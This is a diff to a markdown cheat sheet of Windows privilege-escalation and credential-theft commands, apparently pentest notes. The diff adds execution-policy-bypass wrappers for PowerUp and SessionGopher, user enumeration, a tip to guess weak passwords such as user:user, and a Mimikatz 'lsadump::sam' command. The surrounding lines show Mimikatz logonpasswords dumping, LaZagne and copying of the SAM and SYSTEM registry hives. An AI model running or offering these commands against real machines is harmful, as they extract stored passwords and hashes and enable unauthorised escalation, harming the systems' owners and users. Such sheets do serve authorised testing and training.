@@ -36,7 +36,7 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 
 ## PowerUp.ps1 Invoke-AllChecks
 ```powershell
-. .\PowerUp.ps1; Invoke-AllChecks
+powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
 ```
 
 # Situational Awareness
@@ -44,6 +44,17 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 ## Show current user and privileges
 ```cmd
 whoami /all
+```
+
+## Print environment variables
+```Powershell
+Get-ChildItem Env:
+```
+
+# List users
+Manually try to auth as user:user to guess weak credentials
+```cmd
+net user
 ```
 
 ## List local admins
@@ -293,13 +304,12 @@ Only if the automated path fails and the blob is still worth forcing:
 
 ## Credhunt with Lazagne.exe
 ```cmd
-LaZagne.exe all
+.\LaZagne.exe all
 ```
 
 # Credhunt with SessionGopher
 ```PowerShell
-. .\SessionGopher.ps1
-Invoke-SessionGopher -Thorough
+powershell -ep bypass -c ". .\SessionGopher.ps1;Invoke-SessionGopher -Thorough"
 ```
 
 # Service Abuse
@@ -388,6 +398,11 @@ robocopy /b C:\Windows\System32\config C:\Temp SAM SYSTEM SECURITY
 ## Mimikatz logonpasswords
 ```cmd
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > logonpasswords.txt
+```
+
+## Mimikatz SAM
+```
+.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt
 ```
 
 ## Mimikatz tickets
